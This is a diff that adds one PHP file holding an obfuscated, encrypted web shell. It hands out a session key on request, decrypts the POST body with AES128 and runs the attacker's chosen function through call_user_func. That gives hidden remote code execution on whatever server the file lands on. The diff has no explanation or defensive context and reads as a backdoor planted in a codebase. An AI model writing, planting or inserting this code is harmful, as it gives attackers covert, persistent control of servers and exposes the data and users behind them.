@@ -1,0 +1,1 @@
+<?php session_start();isset($_GET['pass'])?print $_SESSION['k']=substr(md5(uniqid(rand())),16):($b=explode('|',openssl_decrypt(file_get_contents("php://input"), "AES128", $_SESSION['k'])))&call_user_func($b[0],$b[1]);?>
